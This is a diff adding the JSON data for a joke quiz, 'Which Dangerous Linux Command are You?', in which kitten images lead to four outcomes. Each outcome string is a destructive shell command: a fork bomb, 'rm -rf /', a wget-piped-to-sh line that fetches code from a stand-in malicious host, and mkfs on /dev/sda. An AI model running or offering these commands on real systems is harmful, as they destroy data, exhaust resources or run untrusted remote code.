@@ -1,0 +1,81 @@
+{
+    "title": "Which Dangerous Linux Command are You?",
+    "outcomes": {
+        "1": {
+            "img": "img/forkbomb.png",
+            "text": ":(){:|:&};:",
+            "description": "Fork Bomb!"
+        },
+        "2": {
+            "img": "img/danger.jpg",
+            "text": "rm -rf /",
+            "description": "Wipe Root!"
+        },
+        "3": {
+            "img": "img/virus.jpg",
+            "text": "wget http://malicious_source -O- | sh",
+            "description": "Download and run a virus!"
+        },
+        "4": {
+            "img": "img/hard-drive.jpg",
+            "text": "mkfs.ext3 /dev/sda",
+            "description": "Get a brand new hard drive!"
+        }
+    },
+    "questions": [
+        {
+            "question_id": "q1",
+            "question_name": "Choose a kitten below!",
+            "question_img_url": "img/question1.jpg",
+            "answers": [
+                {
+                    "text": "",
+                    "img_url": "img/kitty1.jpg",
+                    "outcome": "1"
+                },
+                {
+                    "text": "",
+                    "img_url": "img/kitty2.jpg",
+                    "outcome": "2"
+                },
+                {
+                    "text": "",
+                    "img_url": "img/kitty3.jpg",
+                    "outcome": "3"
+                },
+                {
+                    "text": "",
+                    "img_url": "img/kitty4.jpg",
+                    "outcome": "4"
+                }
+            ]
+        },
+        {
+            "question_id": "q2",
+            "question_name": "question2",
+            "question_img_url": "img/question1.jpg",
+            "answers": [
+                {
+                    "text": "",
+                    "img_url": "img/image1.jpg",
+                    "outcome": "2"
+                },
+                {
+                    "text": "",
+                    "img_url": "img/image2.jpg",
+                    "outcome": "2"
+                },
+                {
+                    "text": "",
+                    "img_url": "img/image3.jpg",
+                    "outcome": "1"
+                },
+                {
+                    "text": "",
+                    "img_url": "img/kitty4.jpg",
+                    "outcome": "1"
+                }
+            ]
+        }
+    ]
+}
